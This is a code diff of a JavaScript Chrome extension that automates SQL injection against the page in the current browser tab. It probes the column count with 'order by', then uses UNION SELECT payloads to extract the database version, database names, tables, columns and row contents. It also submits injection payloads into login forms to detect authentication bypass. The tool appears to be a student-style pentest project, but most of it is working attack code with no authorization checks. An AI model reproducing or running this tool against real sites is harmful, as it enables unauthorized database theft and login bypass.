@@ -1,24 +1,14 @@
-/*
-* Get the current URL of the selected Chrome tab. Call to getCurrent
-* By Javier Santos
-* https://gist.github.com/javiersantos/c3e9ae2adba72e898f99
-*/
-
 var currentURL;
+
+var splitUrl;
+
+var baseUrl;
 
 var newUrl;
 
-var idName;
-
-var tagName;
-
-var idName2;
-
-var tagName2;
-
 var tableName;
 
-var mostFrequentWord;
+var columnInfo;
 
 var allTables;
 
@@ -44,16 +34,22 @@ var errors = ["Syntax error:", "SQL syntax", "Lexical error"];
 // login error array for username, password & form injection (when user is able to login with payload)
 var loginErrors = ["Sign Off", "Log Off"];
 
-// get the column number and html tag where database information will be nested
+// split the current url and get the column number where database information will be nested
 document.getElementById("start").addEventListener("click", function(){
-  // getHTMLTag();
+  splitCurrentUrl();
   enumerateColumn();
 });
+// get the list of tables in the database and create a table drop down list
 document.getElementById("tableBtn").addEventListener("click", enumerateTable);
+// get the value from the table drop down list
 document.getElementById("tableRow").addEventListener("click", getTableInput);
+// get the column and column type from the table
 document.getElementById("tableInfo").addEventListener("click", enumerateTableInfo);
+// get the column information form the table
 document.getElementById("tableColumnInfo").addEventListener("click", enumerateColumnInfo);
+// get the value from the checked checkboxes
 document.getElementById("getTableColumn").addEventListener("click", getColumnInfo);
+// get all the input field on the webpage
 document.getElementById("getInputField").addEventListener("click", getInputField);
 
 chrome.tabs.query({'active': true, 'windowId': chrome.windows.WINDOW_ID_CURRENT}, 
@@ -61,38 +57,37 @@ function(tabs){
 	getCurrentURL(tabs[0].url);
 	window.location = currentURL;
 });
-
+// function to get current URL
 function getCurrentURL(tab){
 	currentURL = tab;
     document.getElementById("urlName").value=currentURL;
 }
-// URL SQLi
 // enumerate webpage to find the number of columns
 async function enumerateColumn() {
   var OrderBy = 1;
   var MaxOrderBy = 999;
-  var getColumnNo = /mysql_fetch_array\(\)|internal server error/i;
-  const urlError = /page not found/i;
-  
+  // 
+  const getColumnRegex = /mysql_fetch_array\(\)|internal server error/i;
+  // increment webpage https://example.com/product.php?id=1 order by 1 
   while (OrderBy <= MaxOrderBy) {
-    newUrl = currentURL + "%20order%20by%20" + OrderBy;
+    // concatenate the currentURL and payload
+    const newUrl = currentURL + "%20order%20by%20" + OrderBy;
     console.log(newUrl);
     
     try {
+      // fetch the newUrl and retreive it's content
       const response = await fetch(newUrl);
       const data = await response.text();
-      
-      if (getColumnNo.test(data)) {
-        console.log("Regex match found in: " + newUrl);
-		    const columnNo = document.createElement("p");
+      // check if getColumnRegex is in the newUrl content
+      if (getColumnRegex.test(data)) {
+        // create a text node to display the column number
 		    intOrderBy = parseInt(OrderBy) - 1
 		    const columnNoNode = document.createTextNode("Total column: " + intOrderBy.toString());
-		    columnNo.appendChild(columnNoNode);
 		    const element = document.getElementById('columnNo');
 		    element.appendChild(columnNoNode);
-		    console.log(parseInt(OrderBy)-1)
         break;
       }
+      // check if response is 404 and create a text node to display error
       else if(response.status === 404){
         const errorMsg = document.createElement("p");
         const errorMsgNode = document.createTextNode("Error! Please enter a valid URL!");
@@ -102,6 +97,7 @@ async function enumerateColumn() {
         break;
       }
     } catch (error) {
+      // create a text node to display error
       const errorMsg = document.createElement("p");
       const errorMsgNode = document.createTextNode("Error! Please enter a valid URL!");
       errorMsg.appendChild(errorMsgNode);
@@ -109,280 +105,162 @@ async function enumerateColumn() {
       element.appendChild(errorMsg);
       break;
     }
+    // increment the webpage order
     OrderBy++;
   }
+  // get database version
   enumerateDatabaseVersion();
+  // get all the database
   enumerateDatabase();
 }
-
-function getHTMLTag(){
-  var splitUrl = currentURL.split('=');
-  var baseUrl = splitUrl[0];
-
-  newUrl = baseUrl + "=%27";
-
-  console.log(newUrl);
-  // const sqlData = /you\s+have\s+an\s+error\s+in\s+your\s+sql\s+syntax/i
-
-  // const sqlData = /mysql_fetch_array()/i
-  // const sqlData = /sql\s+syntax/i
-  const sqlData = /error|sql syntax/i;
-  fetch(newUrl)
-  .then(response => response.text())
-  .then(data => {
-    const index = data.search(sqlData);
-    const substring = data.substring(index - 50, index);
-    console.log(substring);
-    var tag = substring.match(/<(\w+)\s+.*?id=["'](\w+)["']/);
-    console.log(tag);
-    tagName = tag[1];
-    idName = tag[2];
-    console.log(tagName);
-    console.log(idName);
-  })
-  .catch(error => console.log(error));
-}
-
+// get database version
 function enumerateDatabaseVersion(){
-	var splitUrl = currentURL.split('=');
-  var baseUrl = splitUrl[0];
+  // payload to get the database version wrapped with {{}}
   const payload = "group_concat(0x7b,0x7b,version(),0x7d,0x7d)";
-
-	newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"
-
+  // concatenate the baseUrl and payload with the number of columns
+	const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"
+  // display the URL in the console
 	console.log(newUrl);
+
+  // fetch the newUrl and retreive it's content
   fetch(newUrl)
   .then(response => response.text())
   .then(data => {
-    // var doc = new DOMParser().parseFromString(data, "text/html");
-    // const divContent = doc.getElementById(idName).innerHTML;
-    // console.log(divContent);
-    const textContent = data.replace(/<[^>]+>/g, " ");
-    console.log(textContent);
-
-        // Convert the content to an array of words
-    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
-    const wordCount = wordsMatch ? wordsMatch.length : 0;
-    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];
-
-    const wordCountMap = {};
-    for (let i = 0; i < wordValue.length; i++) {
-      const word = wordValue[i];
-      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
-    }
-    let maxCount = 0;
-    versionName = "";
-    for (let word in wordCountMap) {
-      if (wordCountMap[word] > maxCount) {
-        maxCount = wordCountMap[word];
-        versionName = word;
-      }
-    }
-
-    // Output the most frequent word
-    console.log(`The most frequent word is "${versionName}" with a count of ${maxCount}.`);
-    const database = document.createElement("p");
+    // count the data wrapped in {{}} and retrieve the version
+    versionName = countData(data, versionName);
+    // create a text node to display the database version in the div with id version
     const databaseNode = document.createTextNode("Database version: " + versionName);
-		database.appendChild(databaseNode);
 		const element = document.getElementById('version');
     element.appendChild(databaseNode);
-    console.log(versionName);
   })
   .catch(error => console.log(error));
 }
-
+// get all the database name
 function enumerateDatabase(){
-	var splitUrl = currentURL.split('=');
-  var baseUrl = splitUrl[0];
+  // payload to get the database name wrapped with {{}}
   const payload = "group_concat(0x7b,0x7b,database(),0x7d,0x7d)";
-
-	newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"
-
+  // concatenate the baseUrl and payload with the number of columns
+	const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"
+  // display the URL in the console
 	console.log(newUrl);
+
+  // fetch the newUrl and retreive it's content
   fetch(newUrl)
   .then(response => response.text())
   .then(data => {
-    // var doc = new DOMParser().parseFromString(data, "text/html");
-    // const divContent = doc.getElementById(idName).innerHTML;
-    // console.log(divContent);
-    const textContent = data.replace(/<[^>]+>/g, " ");
-    console.log(textContent);
-
-    // Convert the content to an array of words
-    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
-    const wordCount = wordsMatch ? wordsMatch.length : 0;
-    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];
-
-    const wordCountMap = {};
-    for (let i = 0; i < wordValue.length; i++) {
-      const word = wordValue[i];
-      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
-    }
-
-    // Find the word with the highest count in the object
-    let maxCount = 0;
-    databaseName = "";
-    for (const word in wordCountMap) {
-      if (wordCountMap[word] > maxCount) {
-        maxCount = wordCountMap[word];
-        databaseName = word;
-      }
-    }
-
-    // Output the most frequent word
-    console.log(`The most frequent word is "${databaseName}" with a count of ${maxCount}.`);
-    // const databaseName = /<h2[^>]*>(.*?)<\/h2>/i;
-    // const checkDatabase = databaseName.exec(divContent);
-    // const text = checkDatabase ? checkDatabase[1] : null;
-    const database = document.createElement("p");
+    // count the data wrapped in {{}} and retrieve all the databases
+    databaseName = countData(data, databaseName);
+    // create a text node to display the database in the div with id database
     const databaseNode = document.createTextNode("Database found: " + databaseName);
-		database.appendChild(databaseNode);
 		const element = document.getElementById('database');
     element.appendChild(databaseNode);
-    console.log(databaseName);
   })
   .catch(error => console.log(error));
 }
-
+// get all the table name
 function enumerateTable(){
-  var splitUrl = currentURL.split('=');
-  var baseUrl = splitUrl[0];
+  // payload to all the table name wrapped with {{}}
   const payload = "concat(0x7b,0x7b,group_concat(table_name),0x7d,0x7d)";
-
-  newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.tables%20where%20table_schema=%27"+databaseName+"%27";
-
+  // concatenate the baseUrl and payload with the number of columns
+  const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.tables%20where%20table_schema=%27"+databaseName+"%27";
+  // display the URL in the console
 	console.log(newUrl);
+
+  // fetch the newUrl and retreive it's content
   fetch(newUrl)
   .then(response => response.text())
   .then(data => {
-    // var doc = new DOMParser().parseFromString(data, "text/html");
-    // const divContent = doc.getElementById(idName).innerHTML;
-    // console.log(divContent);
-    const textContent = data.replace(/<[^>]+>/g, " ");
-    console.log(textContent);
+    // count the data wrapped in {{}} and retrieve all the tables in database
+    allTables = countData(data, allTables);
+    // get id table-container in index
     const formContainer = document.getElementById("table-container");
-    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
-    const wordCount = wordsMatch ? wordsMatch.length : 0;
-    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];
-
-    const wordCountMap = {};
-    for (let i = 0; i < wordValue.length; i++) {
-      const word = wordValue[i];
-      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
-    }
-    // Find the word with the highest count in the object
-    let maxCount = 0;
-    allTables = "";
-    for (const word in wordCountMap) {
-      if (wordCountMap[word] > maxCount) {
-        maxCount = wordCountMap[word];
-        allTables = word;
-      }
-    }
-
-    // Output the most frequent word
-    console.log(`The most frequent word is "${allTables}" with a count of ${maxCount}.`);
+    // split the tables when more tables are present in the database
     tableArray = allTables.split(",");
-    
+    // get id tableName in index
     const table = document.getElementById('tableName');
-
+    // check if tag name ul exists in the index and remove it
     let tableTable = document.getElementsByTagName("ul");
     if(tableTable.length > 0){
       for (let i = tableTable.length - 1; i >= 0; i--) {
+        // remove ul tag name
         tableTable[i].remove();
       }
     }
+    // create new ul tag name in index
     tableTable = document.createElement("ul");
-    console.log(tableArray);
+    // create new li tag name for each tables and add it to ul tag name
     tableArray.forEach(tableName => {
        const tableList = document.createElement("li");
        const tableNameNode = document.createTextNode(tableName);
        tableList.appendChild(tableNameNode);
        tableTable.appendChild(tableList);
     })
+    // add the ul tab into the id tableName
     table.appendChild(tableTable);
-            // Create a dropdown list
-            const dropdown = document.createElement("select");
-            dropdown.id = "table-dropdown";
+    // create a dropdown list
+    const dropdown = document.createElement("select");
+    // downdown id table-dropdown
+    dropdown.id = "table-dropdown";
     
-            // Create options for the dropdown list
-            const defaultOption = document.createElement("option");
-            defaultOption.textContent = "Select a table";
-            defaultOption.disabled = true;
-            defaultOption.selected = true;
-            dropdown.appendChild(defaultOption);
-    
-            tableArray.forEach(function(payload) {
-              const option = document.createElement("option");
-              option.textContent = payload;
-              option.value = payload;
-              dropdown.appendChild(option);
-            });
-          
-            formContainer.appendChild(dropdown);
-
+    // create default options for the dropdown list
+    const defaultOption = document.createElement("option");
+    defaultOption.textContent = "Select a table";
+    defaultOption.disabled = true;
+    defaultOption.selected = true;
+    dropdown.appendChild(defaultOption);
+    // create option for dropdown list for each tables retrieve
+    tableArray.forEach(function(table) {
+      const option = document.createElement("option");
+      option.textContent = table;
+      option.value = table;
+      dropdown.appendChild(option);
+    });
+    // add the dropdown into id table-container
+    formContainer.appendChild(dropdown);
   })
   .catch(error => console.log(error));
-
 }
+// get all table column information
 function enumerateTableInfo(){
-  var splitUrl = currentURL.split('=');
-  var baseUrl = splitUrl[0];
+  // payload to all the table column information wrapped with {{}}
   const payload = "concat(0x7b,0x7b,group_concat(column_name,0x3a,column_type),0x7d,0x7d)";
-  
-  newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.columns%20where%20table_name=%27"+tableName+"%27";
-
+  // concatenate the baseUrl and payload with the number of columns
+  const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.columns%20where%20table_name=%27"+tableName+"%27";
+  // display the URL in the console
 	console.log(newUrl);
+
+  // fetch the newUrl and retreive it's content
   fetch(newUrl)
   .then(response => response.text())
   .then(data => {
-    // var doc = new DOMParser().parseFromString(data, "text/html");
-    // const divContent = doc.getElementById(idName).innerHTML;
-    // console.log(divContent);
-    const textContent = data.replace(/<[^>]+>/g, " ");
-    console.log(textContent);
-
-        // Convert the content to an array of words
-    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
-    const wordCount = wordsMatch ? wordsMatch.length : 0;
-    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];
-
-    const wordCountMap = {};
-    for (let i = 0; i < wordValue.length; i++) {
-      const word = wordValue[i];
-      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
-    }
-    // Find the word with the highest count in the object
-    let maxCount = 0;
-    allColumns = "";
-    for (const word in wordCountMap) {
-      if (wordCountMap[word] > maxCount) {
-        maxCount = wordCountMap[word];
-        allColumns = word;
-      }
-    }
-
-    // Output the most frequent word
-    console.log(`The most frequent word is "${allColumns}" with a count of ${maxCount}.`);
-    
+    // count the data wrapped in {{}} and retrieve all table column information
+    allColumns = countData(data, allColumns);
+     // split the columns when there are more than 1 column in table
     columnArray = allColumns.split(",");
+    // get id table from index
     const table = document.getElementById('table');
+    // check if tag name tr exists in the index and remove it
     let tableTable = document.getElementsByTagName("tr");
     if(tableTable.length > 0){
       for (let i = tableTable.length - 1; i >= 0; i--) {
+        // remove tr tag name
         tableTable[i].remove();
       }
     }
+    // create new tr tag name in index
     tableTable = document.createElement("tr");
+    // create two th with name column and type
     const tableColumn = document.createElement("th");
     const tableType = document.createElement("th");
     const columnName = document.createTextNode("Column");
     const typeName = document.createTextNode("Type");
+    // add them to id table
     tableColumn.appendChild(columnName);
     tableType.appendChild(typeName);
     tableTable.appendChild(tableColumn);
     tableTable.appendChild(tableType);
     table.appendChild(tableTable);
+    // create two td tag name for each column and type respectively and add it to tr tag name
     columnArray.forEach((allColumns) => {
       const[column, type] = allColumns.split(":");
       const tableTable = document.createElement("tr");
@@ -392,101 +270,63 @@ function enumerateTableInfo(){
       const typeName = document.createTextNode(type);
       tableColumn.appendChild(columnName);
       tableType.appendChild(typeName);
-
+      // create a checkbox for each a pair of column and type
       const tableCheckbox = document.createElement("td");
       const checkbox = document.createElement("input");
       checkbox.type = "checkbox";
       checkbox.name = "checkbox";
       checkbox.value = column;
       tableCheckbox.appendChild(checkbox);
-
+      // add the checkbox into id table
       tableTable.appendChild(tableColumn);
       tableTable.appendChild(tableType);
       tableTable.appendChild(tableCheckbox);
       table.appendChild(tableTable);
-      
     })
-    // const database = document.createElement("p");
-    // const databaseNode = document.createTextNode("Database found: " + databaseName);
-		// database.appendChild(databaseNode);
-		// const element = document.getElementById('database');
-    // element.appendChild(databaseNode);
-    // console.log(databaseName);
   })
   .catch(error => console.log(error));
-  
 }
+// get column information
 function enumerateColumnInfo(){
-  var splitUrl = currentURL.split('=');
-  var baseUrl = splitUrl[0];
-  console.log(columnInfomation); 
-  // const splitColumnInfomation = columnInfomation.split(',');
+  // get id table from index
   const table = document.getElementById('tables');
+  // create a tr tag name
   const tableColumnHeader = document.createElement('tr');
 
     let i = 0;
+    // create a th tag name for each item in columnInformation array and add them to the th tag name
     while(i < columnInfomation.length){
       const tableColumnHeaderCell = document.createElement('th');
       const tableColumnHeaderText = document.createTextNode(columnInfomation[i]);
       
       tableColumnHeaderCell.appendChild(tableColumnHeaderText);
       tableColumnHeader.appendChild(tableColumnHeaderCell);
-      // console.log(splitColumnInfomation[i]);
       i++;
     }
     table.appendChild(tableColumnHeader);
-
+  // split the with : 
   const newColumnInformation = columnInfomation.map(item => `${item},0x3a`).join(',');
   const modifiedColumnInformation = newColumnInformation.replace(/(.*)(0x3a)/, '$1' + '0x3b');
-  console.log(newColumnInformation); 
-  console.log(modifiedColumnInformation);
+  // payload for the table column information wrapped with {{}}
   const payload = "concat(0x7b,0x7b,group_concat("+modifiedColumnInformation+"),0x2c,0x7d,0x7d)"
-
-  newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20"+tableName;
-
+  // concatenate the baseUrl and payload with the number of columns
+  const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20"+tableName;
+  // display the URL in the console
 	console.log(newUrl);
+
+  // fetch the newUrl and retreive it's content
   fetch(newUrl)
   .then(response => response.text())
   .then(data => {
-    // var doc = new DOMParser().parseFromString(data, "text/html");
-    // const divContent = doc.getElementById(idName).innerHTML;
-    // console.log(divContent);
-    const textContent = data.replace(/<[^>]+>/g, " ");
-    console.log(textContent);
-
-
-    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
-    const wordCount = wordsMatch ? wordsMatch.length : 0;
-    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];
-
-    const wordCountMap = {};
-    for (let i = 0; i < wordValue.length; i++) {
-      const word = wordValue[i];
-      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
-    }
-    // Find the word with the highest count in the object
-    let maxCount = 0;
-    mostFrequentWord = "";
-    for (const word in wordCountMap) {
-      if (wordCountMap[word] > maxCount) {
-        maxCount = wordCountMap[word];
-        mostFrequentWord = word;
-      }
-    }
-
-    // // Output the most frequent word
-    // console.log(`The most frequent word is "${mostFrequentWord}" with a count of ${maxCount}.`);
-    
-    // const database = document.createElement("p");
-    // const databaseNode = document.createTextNode("Table found: " + mostFrequentWord);
-		// database.appendChild(databaseNode);
-		// const element = document.getElementById('database');
-    // element.appendChild(database);
-    // console.log(mostFrequentWord);
-
-    const tableRow = mostFrequentWord.split(";,");
+    // count the data wrapped in {{}} and retrieve all column information
+    columnInfo = countData(data, columnInfo);
+     // split the columns when there are more than 1 column in table
+    const tableRow = columnInfo.split(";,");
+    // get id tables from index
     const table = document.getElementById('tables');
+    // create new tr tag name for each row and td tag name for each col of data
     tableRow.forEach(row => {
+      // split row with :
       const column = row.split(":");
       const newRow = document.createElement("tr");
       column.forEach(col =>{
@@ -497,15 +337,14 @@ function enumerateColumnInfo(){
       })
       table.appendChild(newRow);
     });
+    // reset column information array
     columnInfomation = [];
-    //table.appendChild(newRow);
   })
   .catch(error => console.log(error));
   
 }
+// get the checked checkboxes from the table column
 function getColumnInfo(){
-  // const columnField = document.getElementById('table');
-  // columnInfomation = columnField.value;
   const checkboxes = document.getElementsByName("checkbox");
   const selectedCheckboxes = [];
 
@@ -517,218 +356,242 @@ function getColumnInfo(){
   console.log(columnInfomation);
   return selectedCheckboxes;
 }
+// get the selected table from drop down list
 function getTableInput(){
   const tableField = document.getElementById('table-dropdown');
   tableName = tableField.value;
 }
+// get the payload length by checking the number of columns and concatenate the payload together with ,
 function generatePayloadLength(columnNumber, payload){
   const payloadArray = new Array(columnNumber).fill(payload);
   return payloadArray.join(",");
 }
-function removeTable(elementId){
-  const element = document.getElementById(elementId);
-  if(element.hasChildNodes()){
-    const table = element.getElementsByTagName('table')[0];
-    element.removeChild(table);
+
+// split the URL https://example.com/product.php?id=1 into https://example.com/product.php?id and 1
+function splitCurrentUrl(){
+  // split the URL https://example.com/product.php?id=1 into https://example.com/product.php?id and 1
+  splitUrl = currentURL.split('=');
+  // get baseUrl https://example.com/product.php?id
+  baseUrl = splitUrl[0];
+}
+
+// count the occurence of data wrapped in {{}}
+function countData(data, output){
+  // replace the HTML tag of the content with a blank space
+  const textContent = data.replace(/<[^>]+>/g, " ");
+
+  // extract database version wrapped with {{}}
+  const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
+  const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];
+
+   // count the number of words in {{}}
+  const wordCountMap = {};
+  for (let i = 0; i < wordValue.length; i++) {
+    const word = wordValue[i];
+    wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
   }
+  // Find the word with the highest count
+  let maxCount = 0;
+  output = "";
+  for (const word in wordCountMap) {
+    if (wordCountMap[word] > maxCount) {
+      maxCount = wordCountMap[word];
+      output = word;
+    }
+  }
+  return output
 }
 
 // form SQLi
-
+// generate input field on chrome extension
 function getInputField(){
+  // fetch the current url and retreieve it's content
   fetch(currentURL)
     .then(response => response.text())
     .then(data => {
-      // Create a new HTML document from the retrieved content
+      // create a new html document from the retrieved content
       const doc = new DOMParser().parseFromString(data, "text/html");
+      // get the id form-container from index
       const formContain = document.getElementById("form-container");
-      // Get all the form elements on the webpage
+      // get all the form elements on the webpage
       const formElements = doc.getElementsByTagName("form");
-      // Iterate over each form element and create a separate container for each form
+      // iterate each form element and create a separate container for each form
       for (let i = 0; i < formElements.length; i++) {
         const form = formElements[i];
+        // create div tag name for form
         const formContainer = document.createElement("div");
         formContainer.id = form.id;
-        // Enumerate the input fields and add them to the form container
+        // enumerate input fields and add them to form container
         const inputFields = form.getElementsByTagName("input");
         for (let j = 0; j < inputFields.length; j++) {
           const inputField = inputFields[j];
           if (inputField.type === "text" || inputField.type === "password") {
-            // Create a new input field in the extension
+            // create input tag name
             const inputElement = document.createElement("input");
             inputElement.type = "text";
             inputElement.placeholder = inputField.name;
             inputElement.id = inputField.id;
-            // Create a dropdown list
+            // create dropdown list
             const dropdown = document.createElement("select");
             dropdown.id = inputField.id + "-dropdown";
 
-            // Create options for the dropdown list
+            // create options for the dropdown list
             const defaultOption = document.createElement("option");
             defaultOption.textContent = "Select a value";
             defaultOption.disabled = true;
             defaultOption.selected = true;
             dropdown.appendChild(defaultOption);
-
+            // create options for the dropdown list using payloads array
             payloads.forEach(function (payload) {
               const option = document.createElement("option");
               option.textContent = payload;
               dropdown.appendChild(option);
             });
 
-            // Add an event listener to the dropdown list to update the corresponding input field when an option is selected
+            // event listener for dropdown list to update input field when an option is selected
             dropdown.addEventListener("change", function () {
               inputElement.value = this.value;
             });
+            // create div tag name and add it to newly created div tag name
             const inputContainer = document.createElement("div");
             inputContainer.appendChild(dropdown);
             inputContainer.appendChild(inputElement);
             formContainer.appendChild(inputContainer);
           }
         }
-
-        // Create a button to update the input fields on the webpage
+        // create button to scan vulnerabilty with selected payload on the webpage
         const scanSqlButton = document.createElement("button");
         scanSqlButton.textContent = "SQLi vulnerability Scan";
         scanSqlButton.addEventListener("click", function () {
           const formContainer = this.parentNode;
           checkSQLInjection(formContainer.id);
         });
+        // create button to scan vulnerabilty with all payload on the webpage
         const scanFullSqlButton = document.createElement("button");
         scanFullSqlButton.textContent = "Full SQLi vulnerability Scan";
         scanFullSqlButton.addEventListener("click", function () {
           const formContainer = this.parentNode;
           checkAllSQLInjection(formContainer.id);
         });
-
-        // Add the button to the form container
+        // add buttons to id form-container
         formContainer.appendChild(scanSqlButton);
         formContainer.appendChild(scanFullSqlButton);
-
-
-        // Add the form container to the page
         formContain.appendChild(formContainer);
       }
     })
     .catch(error => console.log(error));
     
 }
+// scan vulnerabilty with selected payload on the webpage
 function checkSQLInjection(formContainer) {
+  // fetch the current url and retreieve it's content
   fetch(currentURL)
   .then(function(response) {
     return response.text();
   })
   .then(function(html) {
-    // create a dummy DOM element to parse the HTML string
+    // create dummy dom element to parse the html string
     const parser = new DOMParser();
-    console.log(formContainer);
     const doc = parser.parseFromString(html, 'text/html');
-    // get the login form and add a submit event listener to intercept the submission
+    // get the form with id from formContainer
     const loginForm = doc.getElementById(formContainer);
-    console.log(loginForm);
+    // get path name of id from formContainer
     const loginAction = new URL(loginForm.action).pathname;
-    console.log(loginAction);
-    // if(loginAction.includes('.')){
-
-    // }
-    // else{}
+   // split the URL https://example.com/product.php into https://example.com/ and product.php
     const splitUrl = currentURL.split('/');
+    // ensure URl is https://example.com
     const domain = splitUrl.slice(0, -1).join('/');
-    const page = splitUrl[splitUrl.length - 1];
     let newUrl = "";  
+    // check if the path name from loginAction has .
     if(loginAction.includes('.')){
       const fileExtension = loginAction.split('.').pop();
       if(fileExtension === 'php' || fileExtension === 'com' || fileExtension === 'jsp'){
+        // concatenate https://example.com with the path name
         newUrl = domain + loginAction;
       }
       else{
+        // concatenate https://example.com with the path name
         newUrl = domain + loginAction;
       }
     }
     else{
+      // concatenate https://example.com with the path name
       newUrl = domain + loginAction;
     }
     console.log(newUrl);
+    // get all input field with type text, password or email
     const inputFields = loginForm.querySelectorAll('input[type=text], input[type=password], input[type=email]');
 
-    console.log(inputFields);
     const payloadObj = {};
+    // loop to get all the value of the input field and add them to payloadObj array
     inputFields.forEach(function(input){
       const inputName = input.getAttribute('name');
       const inputValue = document.getElementById(inputName).value;
       input.value = inputValue;
       payloadObj[inputName] = inputValue;
     })
+    // get the value of the button with input field type submit
     const buttonFields = loginForm.querySelector('input[type=submit]')
     const buttonName = buttonFields.getAttribute('name');
     const buttonValue = buttonFields.value;
+    // check if button exist
     if(!buttonName){
       
     }
     else{
+      // add button to payloadObj array
       payloadObj[buttonName] = buttonValue;
     }
-    // set the input values
-
-    // create a new XMLHttpRequest object
+    // create new XMLHttpRequest object
     const xhr = new XMLHttpRequest();
-    console.log(xhr);
-    // set the URL to doLogin
-    // const url = 'https://demo.testfire.net/doLogin';
-  
-    // set the request method to POST
+    // set request method
     xhr.open('POST', newUrl);
-  
-    // set the request header to send form data
+    // set request header to send form data
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  
-    // create the payload with the injected SQL code
+    // create payload with injected SQL code
     // convert the payload object to a string
     const payloadStr = Object.keys(payloadObj).map(key => {
       return encodeURIComponent(key) + '=' + encodeURIComponent(payloadObj[key]);
     }).join('&');
-    console.log(payloadStr);
-    // add an event listener to handle the response
+    // add event listener to handle the response
     xhr.addEventListener('load', function() {
-      // get the response text and log it
+      // get response text and response url
       const responseText = xhr.responseText;
       const responseUrl = xhr.responseURL;
       let responseErrorText = ""
-      console.log(responseText);
+      // check if response text content items from errors array
       if (errors.some(error => responseText.toLowerCase().includes(error.toLowerCase()))) {
-        // loop over the payload object and search for the name or ID of each input field
+        // loop payloadObj and search for name or id of each input field
         Object.keys(payloadObj).forEach(function(key) {
           const fieldValue = payloadObj[key];
           const fieldName = key.toLowerCase();
+          // check if field value is the same as payloads array and print the response error
           if (payloads.includes(fieldValue)) {
-          // check if the response text contains the name or ID of the input field
-            // if (responseText.includes(fieldName)) {
-              responseErrorText = 'Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!';
-              // console.log('Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!');
-            // }
+            responseErrorText = 'Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!';
           }
         });
       }
+      // check if response url is the same as current url
       else if(responseUrl !== currentURL){
+        // check if response text content items from loginErrors array
         if(loginErrors.some(loginErrors => responseText.toLowerCase().includes(loginErrors.toLowerCase()))){
+          // loop payloadObj and search for name or id of each input field
           Object.keys(payloadObj).forEach(function(key) {
             const fieldValue = payloadObj[key];
-            const fieldName = key.toLowerCase();         
+            const fieldName = key.toLowerCase();
+            // check if field value is the same as payloads array and print the response error    
             if (payloads.includes(fieldValue)) {
-              console.log(fieldValue);
-              console.log(fieldName);
               responseErrorText = 'Log in to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
-              console.log('Log in to '+ responseUrl + 'with' + fieldName + ' field with payload "' + fieldValue +'"!');
             }
           });
         }
         else{
+          // loop payloadObj and search for name or id of each input field
           Object.keys(payloadObj).forEach(function(key) {
             const fieldValue = payloadObj[key];
-            const fieldName = key.toLowerCase();         
+            const fieldName = key.toLowerCase(); 
+            // check if field value is the same as payloads array and print the response error      
             if (payloads.includes(fieldValue)) {
-              console.log(fieldValue);
-              console.log(fieldName);
               responseErrorText = 'Redirected to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
               console.log('Redirected to '+ responseUrl + 'with' + fieldName + ' field with payload "' + fieldValue +'"!');
             }
@@ -736,8 +599,16 @@ function checkSQLInjection(formContainer) {
         }
       }
       else{
-          console.log('')
+        // loop payloadObj and search for name or id of each input field
+        Object.keys(payloadObj).forEach(function(key) {
+          const fieldValue = payloadObj[key];
+          const fieldName = key.toLowerCase();
+          if (payloads.includes(fieldValue)) {
+            responseErrorText = 'Error getting response with ' + fieldName + ' field with payload "' + fieldValue + '".'
+          }
+        })
       }
+      // add the response error text into index
       const responseError = document.createElement("p");
       const responseErrorNode = document.createTextNode(responseErrorText);
       responseError.appendChild(responseErrorNode);
@@ -747,6 +618,7 @@ function checkSQLInjection(formContainer) {
     // send the payload and submit the form
     xhr.send(payloadStr);
     loginForm.submit();
+    // abort the xhr in 5 seconds
     setTimeout(() => {
       xhr.abort();
     }, 5000);
@@ -755,49 +627,52 @@ function checkSQLInjection(formContainer) {
     console.log(error);
   });
 }
+// scan vulnerabilty with all payload on the webpage
 function checkAllSQLInjection(formContainer) {
+  // fetch the current url and retreieve it's content
   fetch(currentURL)
   .then(function(response) {
     return response.text();
   })
   .then(function(html) {
-    // create a dummy DOM element to parse the HTML string
